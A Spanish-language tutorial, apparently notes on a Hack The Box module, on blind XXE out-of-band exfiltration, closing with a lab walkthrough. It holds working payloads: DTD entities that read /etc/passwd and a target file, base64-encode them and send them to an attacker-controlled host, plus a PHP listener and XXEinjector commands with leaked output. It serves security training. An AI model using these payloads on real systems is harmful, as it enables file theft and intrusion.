
# Blind Data Exfiltration

En la sección anterior, vimos un ejemplo de una vulnerabilidad `Blind XXE` , donde no recibimos ningún resultado que contuviera ninguna de nuestras entidades de entrada XML. Como el servidor web mostraba errores de ejecución de PHP, podíamos usar esta falla para leer el contenido de los archivos a partir de los errores mostrados. En esta sección, veremos cómo podemos obtener el contenido de los archivos en una situación completamente ciega, donde no obtenemos el resultado de ninguna de las entidades XML ni se muestra ningún error de PHP.

***

## <mark style="color:purple;">Exfiltración de datos out-of-band</mark>

Si intentamos repetir cualquiera de los métodos con el ejercicio que encontramos en `/blind`, notaremos rápidamente que ninguno de ellos parece funcionar, ya que no tenemos forma de tener nada impreso en la respuesta de la aplicación web. Para tales casos, podemos utilizar un método conocido como `Out-of-band (OOB) Data Exfiltration`, que se utiliza a menudo en casos ciegos similares con muchos ataques web, como inyecciones SQL ciegas, inyecciones de comandos ciegas, XSS ciego y, por supuesto, XXE ciego.

En nuestros ataques anteriores, utilizamos un ataque `out-of-band` ya que alojamos el archivo DTD en nuestra máquina e hicimos que la aplicación web se conectara con nosotros (por lo tanto, fuera de banda). Por lo tanto, nuestro ataque esta vez será bastante similar, con una diferencia significativa. En lugar de hacer que la aplicación web envíe nuestra entidad `file` a una entidad XML específica, haremos que la aplicación web envíe una solicitud web a nuestro servidor web con el contenido del archivo que estamos leyendo.

Para ello, podemos utilizar primero una entidad de parámetro para el contenido del archivo que estamos leyendo y, al mismo tiempo, utilizar un filtro PHP para codificarlo en base64. Luego, crearemos otra entidad de parámetro externa y la referenciaremos a nuestra IP, y colocaremos el valor `file` del parámetro como parte de la URL que se solicita a través de HTTP, de la siguiente manera:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://NUESTRA_IP:8000/?content=%file;'>">
```

Si, por ejemplo, el archivo que queremos leer tuviera el contenido de `XXE_SAMPLE_DATA`, entonces el parámetro `file` contendría sus datos codificados en base64 (`WFhFX1NBTVBMRV9EQVRB`). Cuando el XML intente hacer referencia al parámetro externo `oob` desde nuestra máquina, solicitará `http://NUESTRA_IP:8000/?content=WFhFX1NBTVBMRV9EQVRB`. Finalmente, podemos decodificar la cadena `WFhFX1NBTVBMRV9EQVRB` para obtener el contenido del archivo. Incluso podemos escribir un script PHP simple que detecte automáticamente el contenido del archivo codificado, lo decodifique y lo envíe a la terminal:

```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

Entonces, primero escribiremos el código PHP anterior en `index.php`, y luego iniciaremos un servidor PHP en el puerto `8000`, de la siguiente manera:

```shell-session
afsh4ck@kali$ nano index.php # Aquí escribimos el código de arriba
afsh4ck@kali$ php -S 0.0.0.0:8000

PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
```

Ahora, para iniciar nuestro ataque, podemos usar un payload similar al que usamos en el ataque basado en errores, y simplemente agregar `<root>&content;</root>`, que es necesario para hacer referencia a nuestra entidad y hacer que envíe la solicitud a nuestra máquina con el contenido del archivo:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://NUESTRA_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

Luego podemos enviar nuestra solicitud a la aplicación web:&#x20;

<figure><img src="https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_blind_request.jpg" alt=""><figcaption></figcaption></figure>

Finalmente, podemos volver a nuestra terminal y veremos que efectivamente recibimos la solicitud y su contenido decodificado:

```shell-session
PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
10.10.14.16:46256 Accepted
10.10.14.16:46256 [200]: (null) /xxe.dtd
10.10.14.16:46256 Closing
10.10.14.16:46258 Accepted

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...SNIP...
```

{% hint style="info" %}
**Consejo**: además de almacenar nuestros datos codificados en base64 como parámetro de nuestra URL, podemos utilizar `DNS OOB Exfiltration` para de colocar los datos codificados como un subdominio de nuestra URL (por ejemplo `ENCODEDTEXT.our.website.com` ) y luego usar una herramienta como `tcpdump` para capturar todo el tráfico entrante y decodificar la cadena del subdominio para obtener los datos. Es cierto que este método es más avanzado y requiere más esfuerzo para extraer los datos.
{% endhint %}

***

## <mark style="color:purple;">Exfiltración automatizada de OOB</mark>

Aunque en algunos casos es posible que tengamos que usar el método manual que aprendimos anteriormente, en muchos otros casos podemos automatizar el proceso de exfiltración de datos XXE a ciegas con herramientas. Una de esas herramientas es [XXEinjector](https://github.com/enjoiz/XXEinjector) . Esta herramienta admite la mayoría de los trucos que aprendimos en este módulo, incluidos XXE básico, exfiltración de origen CDATA, XXE basado en errores y XXE OOB a ciegas.

Para utilizar esta herramienta para la exfiltración OOB automatizada, primero podemos clonar la herramienta en nuestra máquina, de la siguiente manera:

```shell-session
afsh4ck@kali$ git clone https://github.com/enjoiz/XXEinjector.git
```

Una vez que tenemos la herramienta, podemos copiar la solicitud HTTP de Burp (Botón derecho > Copy to file) y escribirla en un archivo para que la utilice la herramienta. No debemos incluir los datos XML completos, solo la primera línea, y escribir `XXEINJECT` después como un localizador de posición para la herramienta:

{% code title="xxe.req" %}

```http
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

{% endcode %}

Ahora, podemos ejecutar la herramienta con las flags `--host`/ `--httpport` que son nuestra IP y puerto, la flag `--file` que es el archivo que escribimos anteriormente y la flag `--path` que es el archivo que queremos leer. También seleccionaremos las flags `--oob=http` y `--phpfilter` para repetir el ataque OOB que hicimos anteriormente, de la siguiente manera:

```shell-session
afsh4ck@kali$ ruby XXEinjector.rb --host=[NUESTRA-IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter

...SNIP...
[+] Sending request with malicious XML.
[+] Responding with XML for: /etc/passwd
[+] Retrieved data:
```

Vemos que la herramienta no imprimió directamente los datos. Esto se debe a que estamos codificando los datos en base64, por lo que no se imprimen. En cualquier caso, todos los archivos exfiltrados se almacenan en la carpeta `Logs` de la herramienta y podemos encontrar nuestro archivo allí:

```shell-session
afsh4ck@kali$ cat Logs/10.129.201.94/etc/passwd.log 

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...SNIP..
```

***

## <mark style="color:purple;">Caso práctico</mark>

<pre><code><strong>Objetivo: 10.129.139.226
</strong></code></pre>

Usar la exfiltración ciega de datos en la página '`/blind`' para leer el contenido de '`/327a6c4304ad5938eaf0efb6cc3e53dc.php`' y obtener la flag.

<figure><img src="/files/Ah5rpGQ14N2MtvoS39ij" alt=""><figcaption></figcaption></figure>

### 1. Crear archivo DTD

{% code title="xxe.dtd" %}

```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/327a6c4304ad5938eaf0efb6cc3e53dc.php">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://10.10.14.165:8000/?content=%file;'>">
```

{% endcode %}

* Lo ajustamos para leer el contenido de `/327a6c4304ad5938eaf0efb6cc3e53dc.php`
* Añadimos la IP de nuestra máquina de atacante

### 2. Modificar index.php y abrir servidor PHP

{% code title="index.php" %}

```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

{% endcode %}

```shell-session
afsh4ck@kali$ php -S 0.0.0.0:8000
[Mon Nov 25 18:52:35 2024] PHP 8.2.24 Development Server (http://0.0.0.0:8000) started
```

### 3. Añadir payload a solicitud de BurpSuite

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://10.10.14.165:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

{% hint style="info" %}
**Importante**: Debe apuntar al directorio `/blind/`
{% endhint %}

<figure><img src="/files/lfJuma05R2Wvj8EDo53P" alt=""><figcaption></figcaption></figure>

Enviamos la petición y vemos los resultados

### 4. Recibimos la flag

Si volvemos a la terminal con el listener PHP abierto recibimos la conexión blind y obtenemos la flag:

<figure><img src="/files/1uQV2Vrx3MgQGFMqsqX5" alt=""><figcaption></figcaption></figure>
